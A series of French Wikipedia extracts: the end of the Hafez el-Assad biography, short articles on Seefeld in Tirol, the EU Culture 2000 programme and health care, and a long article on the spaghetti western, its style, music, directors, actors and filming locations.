Hafez el-Assad hérite d'un régime dictatorial, établi durant de longues années d'un pouvoir militaire instable, puis réorganisé suivant la politique du parti unique du Baas. Non seulement, il ne rompt pas avec ce régime, mais il en accroît la dimension répressive, qu'il a lui-même constitué depuis plusieurs années, et s'efforce de contrôler chaque secteur de la société à travers un vaste appareil policier et de renseignement. L'ancien responsable nazi et bras droit d'Adolf Eichmann, Alois Brunner, se cache pendant 40 ans en Syrie, protégé par Hafez el-Assad. Il aurait été chargé de la mise en place de l'appareil répressif et des techniques de torture utilisées par les services de renseignement syriens sous Assad.
Le régime met également en place un culte de sa personnalité, le décrivant comme un dirigeant juste, sage et puissant de la Syrie et du monde arabe en général. À la manière soviétique, ce culte se traduit par un vaste système de propagande fait notamment d'affichages de son effigie, d'érections de statues, de discours publics glorificateurs. Le slogan « Assad pour l'éternité » s'installe au fil des plébiscites pour l'unique candidat devenu despote (99,2 % des suffrages officiellement en 1971, 99,6 % en 1978 et 99,9 % en 1985).
Son fils Bassel appelé à lui succéder fait, plus tard, l'objet d'un culte semblable mais meurt dans un accident de voiture le .
Le régime trouve un soutien essentiel dans la minorité alaouite, dont Hafez el-Assad place des membres à de nombreux postes clés de l'appareil d'État.
Le régime se caractérise ainsi par l'emprise qu'il exerce sur la vie sociale et politique, interdisant toute opposition et réprimant avec violence toute contestation. De nombreux intellectuels, défenseurs des droits humains, communistes, personnes soupçonnées d'islamisme sont emprisonnés durant de longues années durant son règne.
Le régime syrien mène également une féroce répression contre l'insurrection des Frères musulmans en Syrie. Le , Hafez el-Assad échappe de justesse à une tentative d'assassinat. Le lendemain, sous le commandement de son frère, Rifaat el-Assad, des membres des Brigades de Défense se rendent à la prison de Palmyre, où un millier de membres des Frères musulmans sont massacrés. Mais l'épisode le plus marquant du conflit est le massacre de Hama en 1982, au cours duquel , en majorité des civils, sont tuées dans les bombardements ou exécutées sommairement.
Selon Amnesty International, ont disparu dans les prisons du régime syrien entre 1980 et 2000, principalement des membres des Frères musulmans, des communistes et des Palestiniens.
Politique étrangère.
Israël.
La politique étrangère de Hafez el-Assad est structurée par le conflit entre la Syrie et Israël – conflit antérieur à la prise de pouvoir de Assad, et qui a continué après sa mort.
Au commencement de sa présidence, la Syrie joue un rôle majeur dans la guerre du Kippour en 1973. La guerre est présentée par le régime comme une importante victoire patriotique, quoique son bilan soit extrêmement nuancé. Après une faible avancée sur le plateau du Golan (territoire syrien occupé par Israël depuis la guerre des Six Jours en 1967), l'armée syrienne connaît d'importantes pertes et doit reculer devant une contre-attaque israélienne. Toutefois, la Syrie regagne, "in fine", des territoires sur le tracé de 1967, grâce aux négociations de paix, dirigées par Henry Kissinger.
La volonté de reconquête de l'intégralité du plateau du Golan n'a pas cessé, par la suite, d'être un des axes centraux de la politique de Hafez el-Assad. Il respecte, toutefois, la ligne de cessez-le-feu placée sous le contrôle des Nations unies. Assad choisit, en effet, une politique indirecte de pression sur Israël, à travers le soutien à divers mouvements arabes, hostiles à l'État juif, qu'il a clientélisés. Ainsi, il soutient le Hezbollah au Liban, durant l'invasion de ce pays par Israël. Il apporte, de même, son soutien à de nombreux groupes palestiniens, comme le Hamas. Assad refuse de reconnaître l'existence d'Israël, officiellement qualifié d'« entité sioniste ». Toutefois, avec la chute de l'URSS, il comprend que l'équilibre des forces avait été transformé en faveur des États-Unis, et de son principal allié dans la région, Israël. Il accepte alors, pressé par les États-Unis, de s'engager dans des négociations avec Israël, qui échouent.
Les Israéliens considéraient Assad comme un ennemi implacable, mais qui tenait parole en respectant le cessez-le-feu, selon Charles Enderlin.
Liban.
Assad joue un rôle clé dans l'histoire du Liban contemporain. La guerre civile libanaise, qui éclate en 1975 et oppose sur fond de conflit israélo-arabe les communautés religieuses du pays (chrétiens et membres de la droite libanaise d'une part, musulmans, « progressistes de gauche » et Palestiniens de l'autre) finit par tourner à la défaveur des chrétiens. Craignant de perdre le pouvoir présidentiel qui était réservé aux chrétiens de rite maronite depuis le Pacte de 1943, les leaders des milices chrétiennes Camille Chamoun et Pierre Gemayel lancent un appel à l'armée syrienne, pour mettre un terme à cette guerre fratricide. Les soldats syriens entrent au Liban le .
Le président syrien, qui soufflait sur les braises de la guerre du Liban, en soutenant tour à tour les différents belligérants, y voit l'occasion d'installer ses troupes au pays du Cèdre, avant-poste de sa lutte contre Israël. Ce sera le début de la mainmise syrienne sur le Liban, qui durera jusqu'à la révolution du Cèdre en 2005.
Assad obtient par ailleurs de Jacques Chirac en 1996 que les dossiers de l'occupation israélienne au Liban et au Golan soient liés, et que la France fasse pression en ce sens sur l'État hébreu. S'étant rendu en visite officielle à Paris en , il comptait d'autant plus sur la France qu'il vouait une admiration au général de Gaulle, qui « représentait en fait la voix de la liberté dans le monde occidental ».
Mort et bilan.
Hafez el-Assad souffre d'un diabète et de problèmes cardiaques. Il meurt le , au cours d'une conversation téléphonique avec son homologue libanais Émile Lahoud.
Le bilan des trente années de règne d'Assad reste controversé : aux critiques contre sa politique interne répressive (écrasement dans le sang des Frères musulmans dont notamment le massacre de Hama) et de son soutien au mouvement chiite libanais Hezbollah, s'opposent des analyses qui voient en lui un « redoutable diplomate » (Henry Kissinger), ainsi que l'homme qui a fait de la Syrie un interlocuteur incontournable dans le règlement des conflits du Proche-Orient. Assad a reçu le surnom de « Bismarck du Proche-Orient ».
Jacques Chirac est le seul chef d’État occidental à se rendre aux funérailles de Hafez el-Assad. Il lui avait rendu hommage à sa mort, saluant celui qui avait « marqué l'Histoire pendant trois décennies ».
Son fils aîné, Bassel, devait lui succéder à la présidence mais la mort de ce dernier dans un accident de voiture en 1994 contraint Assad à changer ses plans. C'est son second fils, Bachar, qui lui succède en comme président, grâce à une modification de la Constitution syrienne ramenant l'âge minimal de 40 à 34 ans.
Le , le mausolée dans lequel reposait son corps est investi par des djihadistes qui ont renversé le régime Assad trois jours auparavant, et son tombeau est détruit par le feu.

</doc>
<doc id="248862" url="https://fr.wikipedia.org/wiki?curid=248862" title="Halle">
Halle



</doc>
<doc id="248875" url="https://fr.wikipedia.org/wiki?curid=248875" title="Seefeld in Tirol">
Seefeld in Tirol

Seefeld in Tirol est une station de sports d'hiver qui se trouve à environ 20 kilomètres à l'ouest d'Innsbruck et à environ 10 kilomètres de la frontière allemande. Seefeld est devenue une des stations de ski de fond les plus prisées des Alpes.
Sa notoriété est surtout due à l'organisation d'épreuves nordiques des Jeux olympiques et des Championnats du monde.
À côté de Seefeld se trouvent les massifs du Mieminger, de Wetterstein et du Karwendel.
Seefeld, avec ses nombreux hôtels, est une des stations touristiques parmi les plus grandes et les plus populaires du Tyrol.
La région, avec Scharnitz, Leutasch, Mösern et Reith, offre au total 250 kilomètres de pistes généralement praticables jusqu'au début avril.
Transports.
Seefeld est joignable par le train depuis Munich et Innsbruck. 
Jeux olympiques et Championnat du Monde.
À Seefeld se sont déroulées les compétitions de ski nordique au cours des jeux olympiques d'hiver à Innsbruck (1964 et 1976), ainsi que les Championnats du monde de ski nordique 1985 et 2019.
Ils ont également organisé la première édition Deaflympics Hiver (équivalent des Jeux Olympiques pour les athlètes Sourd(e)s en 1949.
Histoire.
On mentionne Seefeld pour la première fois en 1022.
Autrefois, les plateaux d'environ 1200 mètres d'altitude autour de Seefeld formaient une région marécageuse et très peu peuplée.

</doc>
<doc id="248877" url="https://fr.wikipedia.org/wiki?curid=248877" title="Communauté de communes de l'Arentele-Durbion-Padozel">
Communauté de communes de l'Arentele-Durbion-Padozel



</doc>
<doc id="248878" url="https://fr.wikipedia.org/wiki?curid=248878" title="Culture 2000">
Culture 2000

Culture 2000 est un programme-cadre de la Communauté européenne en faveur de la culture de 2000 à 2006. 
Le programme « Culture 2000 » est fondé sur l’ du traité instituant la Communauté européenne (traité de Maastricht). 
Depuis le , il est l’instrument unique de financement et de programmation pour la coopération culturelle et intègre les anciens programmes Kaléidoscope (arts vivants), Ariane (littérature) et Raphaël (patrimoine). Le but de ce programme-cadre est de mettre en valeur un espace culturel commun et la promotion de la diversité culturelle en favorisant la coopération entre les acteurs culturels des États participant au programme.
L’enveloppe financière pour l’exécution du programme Culture 2000 pour la période allant du au est de 167 millions d’euros. Le programme est prolongé jusqu’en 2006 avec une enveloppe globale de 236,5 millions d’euros.

</doc>
<doc id="248879" url="https://fr.wikipedia.org/wiki?curid=248879" title="Soins de santé">
Soins de santé

Les soins de santé sont un domaine qui s'appuie sur les sciences appliquées et les connaissances en sciences biomédicales. Ils concernent la santé des humains et la santé animale. Dans les deux cas, ils comprennent des recherches et études scientifiques, ainsi que des études cliniques (étude d'applications thérapeutiques) et de médecine clinique. 
Objectifs et moyens.
Les objectifs des soins de santé sont de :
Pour un être humain, le bien-être est défini par les plans métaboliques, mécaniques, psychiques, professionnels et familiaux. 
Les soins de santé sont catégorisés par un large faisceau d'approches, de disciplines et de spécialités visant au rétablissement d'une condition ou à l'amélioration sensible d'un état de santé, au sens le plus large de ce terme. En effet, tout un ensemble de domaines participe à l'application de ces notions :
La santé est le point focal et l'aboutissement, d'une participation du sujet et de ses aides à l'accomplissement d'un potentiel (aspirations, possibilités intrinsèques) au sein d'un environnement donné.
Les soins de santé restent contemporains des mœurs et tiennent compte des dynamiques d'éthique et de bioéthique, telles que la vie privée, l'avortement, l'euthanasie, le clonage ou encore les manipulations génétiques. En France, les soins doivent être administrés conformément aux règles de déontologie de la profession médicale, présentes dans le code de déontologie médicale, et dans le code de la santé publique.
Branches.
La délivrance des soins dépend des domaines et des branches professionnelles, pouvant inclure : médecine, soin infirmier, soin dentaire et obstétrique. Ainsi que : santé publique, santé communautaire et prévention. Les soins dépendent des différentes perspectives culturelles, politiques, organisationnelles et disciplinaires d'une époque ou d'un contexte.
Premiers soins.
Les premiers soins désignent les services de soin qui jouent un rôle dans les communautés locales. Les professionnels de la santé, comme les médecins traitants et généralistes, s'occupent de ces types de services lors de consultation des patients. Selon la nature de la condition de santé, les patients sont transférés en soins secondaires ou tertiaires. Aux États-Unis, une étude est menée par le depuis 1957 pour recenser les problèmes de santé de la population locale. En 2013, une étude sur montre que des problèmes cutanés (42,7 %), l'arthrose et les problèmes d'articulation (33,6 %), des problèmes de dos (23,9 %), des problèmes de métabolisme (22,4 %), et maladies des voies respiratoires (22,1 %, sans asthme) sont les problèmes de santé les plus courants.
Les premiers soins concernent des patients de tout âge, de tout statut socio-économique, de toute origine ethnique, des patients qui cherchent à maintenir une santé optimale, et des patients souffrant de troubles physiologiques chroniques, de troubles mentaux ou de problèmes sociaux, dont la maladie multiple chronique.
Dans le contexte du vieillissement démographique, avec un risque accru de développer des maladies non transmissibles chez les seniors, la demande de services de premiers soins risque également de s'accroître aussi bien dans les pays développés qu'en voie de développement.
pour avoir plus d’informations, vous devrez explorer votre entourage vous même pour avoir une claire idée 
Santé vétérinaire.
Voir aussi :

</doc>
<doc id="248880" url="https://fr.wikipedia.org/wiki?curid=248880" title="Western spaghetti">
Western spaghetti

L'expression western spaghetti, parfois orthographiée western-spaghetti, aussi nommée western italien ("Western all'italiana" en italien), désigne les westerns produits en Italie. Le filon du western italien a été particulièrement exploité entre 1963 et 1978 avec la production de , notamment les mythiques "Le Bon, la Brute et le Truand" et "Il était une fois dans l'Ouest". Certains films sortis depuis les années 1980, peuvent être considérés encore comme des westerns spaghettis, tels que "On m'appelle Malabar" en 1981 ou "Un dollar pour un mort" en 1998.
Ces films sont devenus populaires en tant que « westerns à l'italienne », tandis qu'aux États-Unis, on appelle ce type de production « "Spaghetti Western" », une expression au départ utilisée dans un sens sarcastique ou péjoratif. Encore aujourd'hui en Italie, ce terme est mal perçu. Néanmoins le genre est reconnu et plébiscité grâce à quelques films devenus mythiques, notamment ceux de Sergio Leone qui lui insufflent une nouvelle jeunesse. Au début des années 1960, le genre western était sur son déclin, et Cinecittà devint un lieu de tournage très rentable pour les Américains. Le western à l'italienne, véritable exercice de réappropriation, finit par influencer en retour le Nouvel Hollywood et toute une génération de réalisateurs à partir des années 1990.
Caractéristiques.
Si les catégories de base du western traditionnel (film d'action, qui se situe au dans l'Ouest américain) se retrouvent bien dans la déclinaison italienne du genre, celle-ci se démarque des productions américaines typiques à plusieurs niveaux. D'abord, c'est un genre cinématographique qui n'a pas pour but de glorifier les valeurs traditionnelles fondatrices de la nation américaine. L'individualisme et l'anomie sont les piliers du monde du western spaghetti : l'ordre est réglé par le revolver, la loi est celle du plus fort. Les règlements de comptes (à cause de dettes dues ou non payées, vengeance personnelle), la violence exercée sur les femmes, le manque d'argent (pauvreté, famine) ou la possibilité de mettre la main sur un magot (vol de diligence, vol de butin à bord d'un train, vol de banque, etc.) et le sexe sont les moteurs omniprésents de l'action. Mais la plupart de ces histoires totalement dénuées de morale sont empreintes d'un humour qui fait basculer les tueries du côté du grand guignol. Les pulsions sexuelles et les excès de violence des personnages de western spaghetti sont primaires, les propos sont explicites et outranciers, la psychologie sommaire. C'est un cinéma de série B qui se veut clairement populaire, grand public, certains ont même écrit « prolétaire ». Pourtant, il va engendrer quelques chefs-d'œuvre, créer un style et révolutionner le cinéma tant dans la mise en scène que dans la prise de vue ou la place de la musique dans un film.
Il est impossible de dire qui est le créateur du western spaghetti. On pourrait tenter de parler de génération spontanée de ce genre sur les ruines d'un cinéma de péplum usé.
Spécificités scénaristiques.
Tout d'abord, le western spaghetti dépasse le schéma manichéen récurrent pour mettre en scène des personnages bien plus complexes. Il ne s'agit plus d'une lutte unilatérale des gentils cow-boys, blancs, chevaleresques et irréprochables contre les Amérindiens sauvages et primitifs ou les terribles bandits mexicains. Au contraire, les protagonistes des westerns spaghettis ont tout de l'antihéros. Misogynes et mal rasés, cyniques et individualistes, ils sont "a priori" plus prompts à dégainer pour le bien de leur portefeuille que pour se mettre au service d'une noble cause. Cependant, ces pistoleros crasseux, hirsutes, violents, bagarreurs, ivrognes, vénaux, sadiques, amoraux ont l'avantage d'être beaucoup plus crédibles que les cow-boys qui après avoir chevauché toute la journée conservent des vêtements immaculés et une coiffure impeccable. Les femmes, bien que jouant un rôle secondaire, ne sont pas à négliger. Elles sont bien souvent des prostituées (ou d'ex-prostituées), elles fument le cigare, boivent du whisky et savent généralement se défendre contre les assauts libidineux des aventuriers à l'hygiène corporelle sommaire voire quasiment inexistante. La violence est omniprésente, on trouve des scènes de duels et de rixes mais aussi des scènes de tabassages, de pendaisons et de mutilations. À la différence des westerns traditionnels, le sang coule et la cruauté est généralement bien répartie entre les bons et les méchants. À la palette spatiale traditionnelle le western spaghetti ajoute un nouveau lieu : la maison close, car les pulsions sexuelles des personnages ne sont pas niées. Du point de vue de la physionomie, si les anti-héros ont des têtes abominables, les méchants n'ont rien à leur envier : ils sont plus terrifiants et grotesques que les héros, sont dotés de tares diverses et variées (strabisme divergeant, gibbosité, scarification…).
Il ne faudrait toutefois pas se réduire à ne voir en eux que des opportunistes prêts à tous les coups bas. En fait, en s'éloignant de l'archétype du héros sans peur et sans reproche, le western spaghetti rend ses personnages bien plus humains, et foncièrement sympathiques malgré tous leurs défauts. En alternative à l'opposition blanc/noir traditionnelle, le western spaghetti propose une palette de gris bien plus complexe, et qui laisse une latitude bien plus grande à la psychologie des personnages. Cette tendance avait déjà émergé dans le western traditionnel dans des films tels que "Vera Cruz".
L'humour n'est pas étranger au western spaghetti, c'est généralement un humour noir voire macabre. Par exemple, dans "Le Bon, la Brute et le Truand", Sentenza, devenu sergent dans un camp de prisonniers, régale Tuco et lui demande s'il aime la musique. Celui-ci répond que ça aide à digérer, alors Sentenza fait jouer l'orchestre puis le fait tabasser par son second, Wallace. Ensuite, Sentenza, allumant calmement sa pipe, demande à Tuco si ça l'aide à digérer.
Certains films spaghetti de série B sont bâtis sur le mode de la comédie de situation. Dans "Un génie, deux associés, une cloche", la majorité des scènes sont prétextes à des situations loufoques ; particulièrement le duel entre Terence Hill et Klaus Kinski (qui est en fait une parodie de duel) et la scène du bordel (où les prostituées et les clients chantent un cantique).
Spécificités esthétiques.
Esthétiquement, le western spaghetti se définit sous l'influence décisive de Sergio Leone par des angles de caméra très largement ouverts sur des paysages imposants, mais aussi par l'utilisation de cadrages originaux et très expressifs (comme des contre-plongées, l'encadrement de la scène dans des fenêtres ou des cordes de potence, etc.) ou des cadrages très serrés (gros plan sur un regard, une main sur la détente d'un revolver…). La musique de film joue également un rôle très important : lente et rythmée, elle s'accélère progressivement pour faire monter l'intensité dramatique lorsque le scénario le réclame. Le western spaghetti a, sans conteste, fourni quelques-unes des plus belles bandes originales du septième art sous la direction d'Ennio Morricone. Parmi les poncifs du genre et sous l'influence une fois de plus de Sergio Leone, il y a encore les longues scènes de duels, lentes et dramatiques, soutenues par une musique lancinante à souhait, avec des successions de gros plans sur les protagonistes. Quelques exemples types :
Dans quelques films, l'usage de flashback permet de mieux cerner les personnages ou de livrer une information capitale sur l'un des héros. Mais Sergio Leone, metteur en scène aussi méticuleux qu'inventif, nous gratifie de flashback dont la construction et la technique viennent rajouter du mystère ou intensifier la dramaturgie.
Dans "Et pour quelques dollars de plus", le flashback relate le viol par Indio de la sœur de Mortimer. La scène, totalement muette, est découpée en trois, depuis le moment où Indio aperçoit la sœur de Mortimer et son jeune mari dans leur chambre, jusqu'au moment où elle se donne la mort. Les images sont accompagnées d'une musique déformée pour rendre le caractère confus de ce souvenir qui hante Indio dans ses moments de délire. La scène relate la nuit de noces au cours de laquelle la sœur de Mortimer et son jeune mari s'échangent deux montres dorées, l'intrusion d'Indio dans la chambre nuptiale, l'assassinat du jeune homme, puis le viol. Tout le mystère est dans ces deux montres musicales ce qui donne à la musique d'Ennio Morricone une importance capitale.
Dans "Il était une fois dans l'Ouest", le flashback décrit l'assassinat par Franck du frère de l'Harmonica. Sergio Leone choisit de découper à nouveau la scène unique de flashback en quatre temps. Le secret de l'homme à l'harmonica ne sera dévoilé qu'à la fin de longues séquences tournées au ralenti et avec une focale totalement floue qui va s'ajuster progressivement pour nous montrer le visage encore jeune de Franck qui, tout sourire, s'apprête à faire exécuter le frère de l'Harmonica. Elle se termine en apothéose au son de l'harmonica. Le ralenti permet à la musique de rendre toute l'intensité de l'émotion dans une durée supérieure à celle de la réalité.
Dans "Il était une fois la révolution", Sergio Leone innove encore. En effet, il livre un flashback morcelé dont les images, nettes de bout en bout cette fois, comportent deux scènes distinctes : la première montre l'amour entre Sean et sa fiancée, et l'amitié de Sean avec son compagnon d'armes dans l'I.R.A. ; la deuxième montre la trahison de cet ami que Sean tue au moment où il est dénoncé et explique les raisons de sa fuite pour l'Amérique. Là encore, le ralenti est choisi pour laisser le thème de Sean, au tempo lent, intensifier la dramaturgie de l'action dans une dilatation du temps habituelle chez Sergio Leone.
Musiques.
Les western spaghetti s'illustrent aussi par un genre particulier de musiques, qui détonnent beaucoup au regard de celles du western traditionnel. Comme dans le reste de son esthétique, le western spaghetti marque cette différence par des thèmes plus 'clichés' ou plus entraînants, d'autres plus froids et menaçants et certains plus amples et plus lyriques ; le tout faisant preuve d'une étonnante inventivité et d'une fraîcheur encore intacte, quand certains des films se sont démodés. Ennio Morricone culmine dans ce domaine. Il composera toutes les musiques des westerns de Sergio Leone. Avec Ennio Morricone la musique de film prend une dimension insoupçonnée jusqu'alors. On y trouve les composantes habituelles : parties lyriques destinées à magnifier l'action et les images, musique ambientale ou narrative pour accompagner les scènes sans dialogues ou pour renforcer les scènes d'intrigue ou de suspense. Mais il fait deux apports majeurs dans la bande son d'un film : la ponctuation sonore, et l'association des personnages à des thèmes musicaux. Pour la ponctuation Ennio Morricone va utiliser des instruments jusque-là peu usités dans le western traditionnel tels que la guimbarde, les carillons ou la flute de Pan. Un petit jingle au moment où le héros replace son cigare dans la bouche, les chœurs masculins ponctuant un scherzo sur une chevauchée ou à la fin d'une séquence sont autant de broderies musicales qui donnent tantôt du relief, tantôt une pointe d'humour à l'action. L'association thème musical - personnage est criante dans la trilogie des "Il était une fois". Le banjo et l'harmonica restent à jamais associés aux personnages de Cheyenne et de l'homme sans nom d"'Il était une fois dans l'Ouest" ou encore le thème d'Amapola au personnage de Deborah dans "Il était une fois en Amérique".
Mais Ennio Morricone est l'arbre qui cache la forêt dans laquelle on trouve des compositeurs parmi lesquels il faut citer Bruno Nicolai, Francesco De Masi, Stelvio Cipriani, Roberto Pregadio, Luis Bacalov, Marcello Giombini.
Films, acteurs et réalisateurs.
C'est sans conteste le réalisateur Sergio Leone qui a définitivement marqué le genre, avec sa "Trilogie du dollar" - "Pour une poignée de dollars", "Et pour quelques dollars de plus" et "Le Bon, la Brute et le Truand" - et avec "Il était une fois dans l'Ouest". D'autres réalisateurs ont toutefois signé des œuvres de qualité, tels Sergio Corbucci avec "Navajo Joe", "Django" ou "Le Grand silence", et Sergio Sollima avec "Colorado" ou "Le Dernier Face à face". On parle d'ailleurs parfois des trois Sergio.
D'autres cinéastes italiens voire étrangers, de plus ou moins grande réputation, se sont illustrés dans le genre : Giacomo Puccini qui crée avec son opéra "La fanciulla del West" le premier western spaghetti en 1910, Giorgio Ferroni, Duccio Tessari, Damiano Damiani, Tonino Valerii, Carlo Lizzani, Robert Hossein… Des acteurs aussi éclectiques que Franco Nero et Giuliano Gemma (connu dans un premier temps sous le pseudonyme de Montgomery Wood) seront toujours associés aux séries "Django" et "Ringo." Plus tard un acteur italo-allemand Mario Girotti alias Terence Hill associé avec un autre acteur italien, Bud Spencer, sera la figure principale de l'orientation du genre vers la comédie : la série des deux films Trinita avec Bud Spencer et en solo dans Et Maintenant on l'appelle El Magnifico, "Mon nom est Personne" de Valerii et dans Un génie, Deux associés, une cloche de Damiani. Bien qu'il est commencé dans une série de westerns dits sérieux et violent comme Django, prépare ton cercueil comme avec Bud Spencer dans la trilogie de Giuseppe Colizzi (Dieu pardonne...moi pas!, Les Quatre de l'Ave Maria, La Colline des Bottes).
Outre les italiens Fabio Testi et Gian Maria Volonté entre autres, des acteurs prestigieux venus de toute l'Europe tournent des westerns italiens : Jean-Louis Trintignant, Terence Stamp, Lou Castel, Fernando Rey, Klaus Kinski, Serge Marquand, Michèle Mercier… De grands acteurs américains de western viendront continuer leur carrière sous la direction des Italiens en Europe : Henry Fonda, Lee Van Cleef, Jack Palance, mais de nombreuses autres vedettes de Hollywood ont fait des apparitions spaghettis : Clint Eastwood qui doit sa gloire au genre, Karl Malden, l'éclectique John Philip Law, Joseph Cotten, Harry Carey Jr., Eli Wallach, le cinéaste Sam Peckinpah, Lionel Stander, Woody Strode, Orson Welles, Yul Brynner, John Ireland, Charles Bronson, Jason Robards, James Coburn, Rod Steiger, Farley Granger, Steve Kanaly (futur cowboy de la série "Dallas")…
Des acteurs venus d'Amérique latine perceront et joueront les premiers rôles dans les westerns italiens : parmi les plus célèbres, le cubain Tomas Milian (de son vrai nom Tomas Rodriguez) dans 13 westerns, le brésilien Anthony Steffen (de son vrai nom Antonio de Teffè) dans 24 westerns et l'uruguayen (bien qu'il est grandit en Angleterre) George Hilton (de son vrai nom Jorge Hilton) dans une douzaine de westerns. Ces trois acteurs sont parmi les plus emblématiques du genre.
Dans les rôles les plus étonnants, Pier Paolo Passolini joue un mexicain au côté de Lou Castel dans Tue et fais ta prière de Carlos Lizzani et l'ancien batteur des Beatles Ringo Starr interprète un bandidos dans Blindman, le justicier aveugle de Ferdinando Baldi.
Des acteurs parviennent à se faire un nom dans plusieurs films grâce à un succès inattendu et à leur rôle de producteur. C'est le cas de Tony Anthony dans la série du "stranger" (Un dollar entre les dents, Un Homme, un cheval et un pistolet, Le Cavalier et le samouraï) et dans des films très similaires comme Blindman, le justicier aveugle, Pendez-les par les pieds et La vengeance impitoyable.
Les personnages des westerns spaghettis sont majoritairement masculins, mais certaines actrices comme Isa Miranda, Laura Betti ou Giovanna Ralli tourneront de nombreux films. Les films mettant en scène des héroïnes sont rares : Pas de pitié pour Ringo avec les jumelles Pilar Bayona et Emilia Bayona, Lola Colt avec Lola Falana, T'as le Bonjour de Trinita (Little Rita Nel West) avec Rita Pavone, ces trois westerns faisant la part belle aux chansons interprétées par les actrices également chanteuses professionnelles, mais aussi Belle Starr ("Il mio corpo per un poker") avec Elsa Martinelli, Les Pétroleuses avec Brigitte Bardot et Claudia Cardinale, Le Triomphe des Sept Desperadas avec un groupe de sept actrices (Anne Baxter, Maria Perschy, Maria Mahor, Perla Cristal, Rosella Como, Christa Linder, Andrina Ambesi), "Jarretière Colt" avec Nicoletta Machiavelli ou encore le tardif Scalps dans lequel Mapy Galan partage l'affiche avec Vassili Karis.
Tous les acteurs de ce cinéma (auteurs, réalisateurs, techniciens, décorateurs et accessoiristes, photographes, interprètes) se concertent pour, dans les meilleurs des cas, donner des œuvres étranges et sombres, des héros mystérieux, d'une humanité exemplaire (sous des dehors parfois brutaux ou effrayants) ou peu sympathiques mais au charisme irrésistible. Le western italien est un terrain de jeu idéal, un jeu de massacre et un jeu de miroirs, un jeu de séduction et de dupe, qui touche souvent au fantastique par des décors originaux, des couleurs saturées, une action parfois décousue et un goût de la surprise qui évoque le roman feuilleton (une mitrailleuse dans un cercueil est une astuce digne de Fantômas).
Héritier du péplum (quelques acteurs se reconvertissent, comme Jacques Sernas) dans une certaine mesure (Sergio Leone, Giorgio Ferroni, Duccio Tessari, Mario Bava se sont essayés aux deux genres) et cousin du giallo (dans lequel Fulci, Valerii et Bazzoni ont aussi donné), le western italien tient à la fois de l'exercice de style aux limites du surréalisme, du théâtre de Grand-Guignol (un tueur devient une attraction de cirque), voire de la farce, et d'une thérapie jouissive sur le thème de Thanatos exécutée dans l'humour et une certaine méchanceté qui rappelle le cinéma italien classique, entre ironie et constat (films psychologiques, comédies ou non, également tournés par Damiani et Lizzani).
Lieux.
Les westerns spaghettis ont principalement été tournés dans le désert de Tabernas dans la région d'Almería en Espagne. Doté d'espaces vierges de présence humaine et ressemblant aux paysages de l'Arizona ou du Nevada avec des conditions météos exceptionnelles, des steppes, des dunes, des ravins, des collines et des canyons. La main-d'œuvre bon marché et la facilité d'accès à quelques kilomètres de grandes villes ont fini de convaincre les réalisateurs de ce style cinématographique à privilégier le désert espagnol aux plaines américaines.
Texas Hollywood situé à Tabernas dans le désert est l'un des trois "poblados" (villages) de western encore en activité (il y en avait à la grande époque jusqu'à 14). Les deux autres ne sont plus utilisés qu'à usage strictement touristique et sont Mini Hollywood (avec un zoo) et Western Leone. Les autres sont laissés à l'abandon.
Un groupe de passionnés espagnols a reconstruit et réhabilité le décor du cimetière de Sad Hill du film Le Bon, la Brute et le Truand dans la province de Burgos. Le processus est raconté dans le documentaire Sad Hill Unearthed (Desenterrando Sad Hill) sorti en 2017. Le site est désormais visitable et régulièrement entretenu.
Pour un même film, les scènes d'intérieur pouvaient être tournées à Cinecittà même si les scènes extérieures étaient tournées en Espagne. Toutefois de nombreux westerns italiens ont été tournés intégralement en Italie (Black Killer, Le Dollar troué, Quand les Colts Fument...on l'Appelle Cimetière)
Le massif montagneux des Dolomites dans les Alpes italiennes a également servi de décor aux films de Sergio Corbucci (Le Grand silence et Le Spécialiste).
D'autres productions italiennes ont été tournées en Algérie (Trois Pistolets contre César) ou en Sardaigne ("Jarretière Colt").
Premières critiques.
Le genre a été très mal accueilli, la critique l'ignorait, les distributeurs se croyant obligés d'américaniser les génériques. En fait, pour certains, faire un western en dehors des États-Unis s'apparentait à un sacrilège. Ainsi Jean Gili : 
Certains réalisateurs de westerns spaghetti eux-mêmes comme Damiano Damiani ont rejeté le terme de « western » :
Le western zapata.
Le "western zapata" (nommé d'après le révolutionnaire mexicain Emiliano Zapata (1879-1919)) ou "western révolutionnaire" est un genre florissant du cinéma italien dans la seconde partie des années 1960. Il s'agit de westerns politiques centrés sur la révolution mexicaine (1910-1920) qui documente l'exploitation des péons par les grands propriétaires. Ces films sont aussi le reflet de l'Italie de l'époque, écartelé entre le sud pauvre et le nord en plein essor économique. Plus généralement, le western zapata véhicule parfois les valeurs du tiers-mondisme et d'anti-impérialisme vis-à-vis de l'ingérence des États-Unis au Viêt-Nam, en Amérique du Sud et ailleurs.
À l'instar des westerns spaghetti, les westerns zapata est souvent structuré par l'antagonisme entre deux personnages très différents. Selon Jean-François Rauger, « On a dans ces films deux figures de l’Italien des années 1960 [...] D'un côté, le chasseur de primes qui ne bosse que pour l'argent et de l'autre, l'homme du peuple, encore inconscient de sa mission politique, et qui va apprendre par la praxis qu'il est en fait au cœur d'un projet révolutionnaire ».
Le premier était "El Chuncho" (1966) de Damiano Damiani, suivi de la trilogie de Sergio Sollima : "Colorado" (1966), "Le Dernier Face à face" (1967) et "Saludos hombre" (1968).
"El mercenario" (1968), "Compañeros" (1970) et "Mais qu'est-ce que je viens foutre au milieu de cette révolution ?" (1972) de Sergio Corbucci ainsi que "Trois pour un massacre" (1969) de Giulio Petroni sont également des marqueurs du genre.
Dans "Il était une fois la révolution" (1971), Leone s'inscrit en même temps dans la continuité du western zapata tout en accentuant sa critique du romantisme révolutionnaire.
Après le succès.
Baroque et caricatural par essence, le western spaghetti abandonne peu à peu son aspect politique et violent pour adopter une forme plus légère avec les pochades burlesques de Terence Hill et Bud Spencer.
À la fin des années 1970, le genre s'essouffle et l'on ajoute des ingrédients d'autres provenances pour essayer de le relancer, ainsi les mélanges avec les films d'arts martiaux - appelés dans le milieu de la critique cinématographique le "western soja" - ont donné "Mon nom est Shangaï Joe" (Mario Caiano, avec Klaus Kinski), ou "La Brute, le Colt et le Karaté" (Antonio Margheriti), dont on note des remakes dans les années 2000 : "Shanghai Kid" avec Jackie Chan.
